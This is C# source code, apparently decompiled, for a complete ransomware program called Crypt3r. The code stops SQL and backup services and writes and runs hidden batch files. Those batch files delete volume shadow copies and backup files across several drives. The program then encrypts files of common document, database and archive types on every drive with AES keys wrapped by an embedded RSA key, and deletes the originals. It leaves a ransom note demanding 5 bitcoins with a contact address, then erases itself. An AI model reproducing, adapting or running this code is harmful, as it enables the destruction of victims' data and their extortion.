using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.ServiceProcess;

namespace Crypt3r;

internal class Program
{
	private static readonly string pubKey = "<RSAKeyValue><Modulus>8KAA7eV/T6Gh63d35gd0XuqjOX4Xnl8cJ8IWuuD21AdGbRHQbL4c8KUoXTgbh/u7kKfRGztdk6BgdsU5/UYpWlv8NE6dDW8crghfBYrq7GK489njdbsPhovFtkcLVhKDiNJO+m6+7K3USujmav3VFZ98ioDcLAI5/WktX7JNVrrNBCzfTDaPRb7rbj3PKiZA8Iy1L5HvE1q6A94qVLuarWst934HeiW6fm9jZJmSqxIIeafxoLttV340kSskEnlm2+yV3aA4T+VXQoflGTC1ssVddCYF2k6SvOIz5twiGGsi+sBCWrMoiiMIk3vYxgAiLRpQjiiUeSpOvGl2iIQrWzE8S4MWvwZ5QWWR8gUD64yymo4MqgvIzGULyx61f3QkGFHNiI5h8Dl+kYdUBZ+v9JUQIoHMHNW/BuaFISAs90kNwwJtiVBgPh+ATDa90BFy8X0DgvGHdPJOzQe/JAIsymmyKa663CR1XWrltzLRvsChDPS2b6LrU0TS+2W+lgxr3PQEfGNE46GsWEMOhF1PhNkLGJg1J864iA0RsZGjPMLGFqa6K/hAoTqopqV7QLh+znOURwcdVVhRp/M2399RNAcgvAhZLWfGtxoJBiG9ko73o0WOX4tWiIXNlgbZS4Ty4FQE9UF0395ryUXoEDvRt0lFtr4+4lxzkGucai4ImdVJo/YNmv4kV4y5QhRTu2WQrTP3QHXuerN0WpAXZakUltHM5gqKSzPkV+2W4P5ax3kyBnIqdDulKhi1TIts8dzdwAKNzDtBV3Hzr03eTPY7iJD3IYvNm+V6S9HhsdJuPDuAjaoNLxgMO3Ju+km9iMpmMGdv8BVuLUs/ooQdqR2vcWGkmiCiz8GzL6VIYvQYaKc4MRYEKVHLs7fmU86uW+eX+yVh0ZbXldffY8S2CNos4oN1D6Tyahmdirlr13LyTMk/BOp68ZvRts6k891LyNFm3IYIVGpEb6XI/tuSCGl+NKHzUJmET3FDxAJPWu/EmdT0LsA68no8SC+8a3/9MGcL1X/7ca3HFllxFb9DX8zQuYfAI28AZOTeVlX/I2rxKGzqzpogu/YyaiquKUG8G2NQygUftUbuqqOMsFc3CfjuQe16vxHW6OX/KiamHDBime0Rs9VSybhkQLWoR+E92GxTXKwLxPX6OR7/A9x3rrtJjqZXbjGTfdDoSOfM4EwFt7QcRI9H3dqVSvzs9Jpni3bYskPiueQ8vzhvZ2Wg0d1Q9wBg+B1qolEW6fFM4pX6c9VnmHY8g2nXF3ZOm6uw3STu4+2S2vo7xx0ga2hCxxNsvA0bZnToDeYo/Cnv9d4brZWehFoJf4ch6ns+XbSptfgXGFgmzRwaZOD02W/npSrioQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

	private static readonly List<string> cryFilter = new List<string>
	{
		"*.txt", "*.crt", "*.cer", "*.jpg", "*.pst", "*.mov", "*.dwg", "*.vbk", "*.vhdx", "*.ndf",
		"*.wk", "*.xlsx", "*.doc?", "*.xls", "*.mdb", "*.mdf", "*.sql", "*.bak", "*.ora", "*.pdf",
		"*.ppt?", "*.dbf", "*.zip", "*.rar", "*.php", "*.jsp?", "*.backup", "*.bk?", "*.csv", "*.7z",
		"*.myd", "*.ibd", "*_fsm", "*_vm", "*.db?", "*.rpt", "*.mpp"
	};

	private static void Main(string[] args)
	{
		try
		{
			passql();
			killers();
		}
		catch
		{
		}
		if (args.Length != 1)
		{
			Console.WriteLine("no cry :)");
		}
		else
		{
			if (!"gocr".Equals(args[0]))
			{
				return;
			}
			foreach (string item in cryFilter)
			{
				try
				{
					CryFiles(item);
				}
				catch
				{
				}
			}
			Console.WriteLine("Finished! :(");
			writetx();
			TestForKillMyself();
		}
	}

	private static void CryFiles(string filter)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if ((driveInfo.DriveType == DriveType.Fixed || driveInfo.DriveType == DriveType.Removable || driveInfo.DriveType == DriveType.NoRootDirectory || driveInfo.DriveType == DriveType.Network) && !driveInfo.IsReady)
			{
				continue;
			}
			foreach (string file in GetFiles(driveInfo.Name, filter, recursive: true))
			{
				CryFile(file);
			}
		}
	}

	private static void CryFile(string filename)
	{
		FileInfo fileInfo = new FileInfo(filename);
		if (fileInfo.IsReadOnly)
		{
			return;
		}
		string outputFilePath = filename + ".RSA";
		try
		{
			Console.WriteLine("[+] " + filename);
			if (EncryptFile(fileInfo.FullName, outputFilePath, pubKey))
			{
				fileInfo.Delete();
			}
		}
		catch
		{
		}
	}

	private static IEnumerable<string> GetFiles(string folder, string filter, bool recursive)
	{
		if (folder.StartsWith("C:\\Windows"))
		{
			yield break;
		}
		string[] array = null;
		try
		{
			array = Directory.GetFiles(folder, filter);
		}
		catch
		{
		}
		string[] array2;
		if (array != null)
		{
			array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				yield return array2[i];
			}
		}
		if (!recursive)
		{
			yield break;
		}
		array = null;
		try
		{
			array = Directory.GetDirectories(folder);
		}
		catch
		{
		}
		if (array == null)
		{
			yield break;
		}
		array2 = array;
		foreach (string folder2 in array2)
		{
			foreach (string file in GetFiles(folder2, filter, recursive))
			{
				yield return file;
			}
		}
	}

	public static bool EncryptFile(string inputFilePath, string outputFilePath, string publicKey)
	{
		bool flag = false;
		using AesManaged aesManaged = new AesManaged();
		byte[] array = new byte[aesManaged.KeySize / 8];
		byte[] array2 = new byte[aesManaged.BlockSize / 8];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			rNGCryptoServiceProvider.GetBytes(array);
			rNGCryptoServiceProvider.GetBytes(array2);
		}
		byte[] array3 = new byte[array.Length + array2.Length];
		Array.Copy(array, array3, array.Length);
		Array.Copy(array2, 0, array3, array.Length, array2.Length);
		array3 = EncryptData(array3, publicKey);
		byte[] bytes = BitConverter.GetBytes(array3.Length);
		using (ICryptoTransform transform = aesManaged.CreateEncryptor(array, array2))
		{
			using FileStream fileStream2 = new FileStream(inputFilePath, FileMode.Open);
			using FileStream fileStream = new FileStream(outputFilePath, FileMode.Create);
			using CryptoStream destination = new CryptoStream(fileStream, transform, CryptoStreamMode.Write);
			fileStream.Write(bytes, 0, bytes.Length);
			fileStream.Write(array3, 0, array3.Length);
			fileStream2.CopyTo(destination, 40971520);
		}
		return true;
	}

	public static byte[] EncryptData(byte[] data, string publicKey)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.FromXmlString(publicKey);
		return rSACryptoServiceProvider.Encrypt(data, fOAEP: true);
	}

	public static void TestForKillMyself()
	{
		string contents = "@echo off\r\n                           :tryagain\r\n                           del %1\r\n                           if exist %1 goto tryagain\r\n                           del %0";
		File.WriteAllText("killme.bat", contents);
		Process.Start(new ProcessStartInfo
		{
			FileName = "killme.bat",
			Arguments = "\"" + Environment.GetCommandLineArgs()[0] + "\"",
			WindowStyle = ProcessWindowStyle.Hidden
		});
	}

	public static void passql()
	{
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Invalid comparison between Unknown and I4
		ServiceController[] services = ServiceController.GetServices();
		foreach (ServiceController val in services)
		{
			if ((val.get_ServiceName().ToLower().StartsWith("mssql") || val.get_ServiceName().ToLower().StartsWith("sql") || val.get_ServiceName().ToLower().StartsWith("postgresql") || val.get_ServiceName().ToLower().StartsWith("oracle") || val.get_ServiceName().ToLower().StartsWith("mysql") || val.get_ServiceName().ToLower().StartsWith("veeam") || val.get_ServiceName().ToLower().StartsWith("backup")) && (int)val.get_Status() == 4)
			{
				try
				{
					val.Stop();
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.Message);
				}
			}
		}
	}

	public static void killers()
	{
		string contents = "@echo off\r\n                          \r\n                          \r\n                           net stop BMR Boot Service /y\r\n                           net stop NetBackup BMR MTFTP Service /y\r\n                           sc config SQLTELEMETRY start= disabled\r\n                           sc config SQLTELEMETRY$ECWDB2 start= disabled\r\n                           sc config SQLWriter start= disabled\r\n                           sc config SstpSvc start= disabled\r\n                           taskkill /IM mspub.exe /F\r\n                           taskkill /IM mydesktopqos.exe /F\r\n                           taskkill /IM mydesktopservice.exe /F\r\n                           vssadmin Delete Shadows /all /quiet\r\n                           del /s /f /q d:\\*.VHD d:\\*.bac d:\\*.bak d:\\*.wbcat d:\\*.bkf d:\\Backup*.* d:\\backup*.* d:\\*.set d:\\*.win d:\\*.dsk\r\n                           del /s /f /q e:\\*.VHD e:\\*.bac e:\\*.bak e:\\*.wbcat e:\\*.bkf e:\\Backup*.* e:\\backup*.* e:\\*.set e:\\*.win e:\\*.dsk\r\n                           del /s /f /q f:\\*.VHD f:\\*.bac f:\\*.bak f:\\*.wbcat f:\\*.bkf f:\\Backup*.* f:\\backup*.* f:\\*.set f:\\*.win f:\\*.dsk \r\n                           del /s /f /q g:\\*.VHD g:\\*.bac g:\\*.bak g:\\*.wbcat g:\\*.bkf g:\\Backup*.* g:\\backup*.* g:\\*.set g:\\*.win g:\\*.dsk\r\n                           del /s /f /q h:\\*.VHD h:\\*.bac h:\\*.bak h:\\*.wbcat h:\\*.bkf h:\\Backup*.* h:\\backup*.* h:\\*.set h:\\*.win h:\\*.dsk\r\n                           del %0";
		File.WriteAllText("kill.bat", contents);
		Process.Start(new ProcessStartInfo
		{
			FileName = "kill.bat",
			Arguments = "\"" + Environment.GetCommandLineArgs()[0] + "\"",
			WindowStyle = ProcessWindowStyle.Hidden
		});
	}

	public static void writetx()
	{
		string contents = "Sorry, your network is encrypted, and encryption is achieved through rsa, which means that the decryption service can only be provided by us. You cannot decrypt data through a security company. They will only contact us to pay the fee. We recommend that you pay 5 bitcoins directly to us , Or send two files to confirm whether we can decrypt, you need to deal with it as soon as possible, because the key file necessary for decryption will not be kept.    Contact:   Good.davis@tutanota.com ";
		File.WriteAllText("c:\\!!!!deReadMe!!!.txt", contents);
		File.WriteAllText("C:\\Users\\Public\\Desktop\\!!!!deReadMe!!!.txt", contents);
	}
}
